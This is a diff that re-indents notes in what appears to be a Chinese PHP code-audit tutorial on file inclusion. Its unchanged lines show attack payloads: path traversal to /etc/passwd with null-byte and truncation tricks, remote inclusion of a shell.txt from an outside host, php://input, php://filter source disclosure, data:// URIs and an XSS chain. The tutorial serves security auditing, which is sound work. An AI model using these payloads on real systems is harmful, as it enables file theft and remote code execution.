@@ -34,7 +34,7 @@ PHP 代码审计
 
      ?file=../../../../../../../../../etc/passwd%00
 
-需要 ``magic_quotes_gpc=off``，PHP 小于 5.3.4 有效。
+   需要 ``magic_quotes_gpc=off``，PHP 小于 5.3.4 有效。
 
 -  路径长度截断
 
@@ -42,7 +42,7 @@ PHP 代码审计
 
      ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
 
-Linux 需要文件名长于 4096，Windows 需要长于 256。
+   Linux 需要文件名长于 4096，Windows 需要长于 256。
 
 -  点号截断
 
@@ -50,7 +50,7 @@ Linux 需要文件名长于 4096，Windows 需要长于 256。
 
      ?file=../../../../../../../../../boot.ini/………[…]…………
 
-只适用 Windows，点号需要长于 256。
+   只适用 Windows，点号需要长于 256。
 
 远程文件包含
 ~~~~~~~~~~~~
@@ -86,7 +86,7 @@ Linux 需要文件名长于 4096，Windows 需要长于 256。
      
      ?file=[http|https|ftp]://example.com/shell.txt
 
-需要 ``allow_url_fopen=On`` 并且 ``allow_url_include=On`` 。
+   需要 ``allow_url_fopen=On`` 并且 ``allow_url_include=On`` 。
 
 -  利用 PHP 流 input
 
@@ -94,7 +94,7 @@ Linux 需要文件名长于 4096，Windows 需要长于 256。
 
      ?file=php://input
 
-需要 ``allow_url_include=On`` 。
+   需要 ``allow_url_include=On`` 。
 
 -  利用 PHP 流 filter
 
@@ -102,7 +102,7 @@ Linux 需要文件名长于 4096，Windows 需要长于 256。
 
      ?file=php://filter/convert.base64-encode/resource=index.php
 
-需要 ``allow_url_include=On`` 。
+   需要 ``allow_url_include=On`` 。
 
 -  利用 data URIs
 
@@ -110,7 +110,7 @@ Linux 需要文件名长于 4096，Windows 需要长于 256。
 
      ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
 
-需要 ``allow_url_include=On`` 。
+   需要 ``allow_url_include=On`` 。
 
 -  利用 XSS 执行
 
@@ -118,7 +118,7 @@ Linux 需要文件名长于 4096，Windows 需要长于 256。
 
      ?file=http://127.0.0.1/path/xss.php?xss=phpcode
 
-需要 ``allow_url_fopen=On``，``allow_url_include=On`` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
+   需要 ``allow_url_fopen=On``，``allow_url_include=On`` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
 
 文件上传
 --------
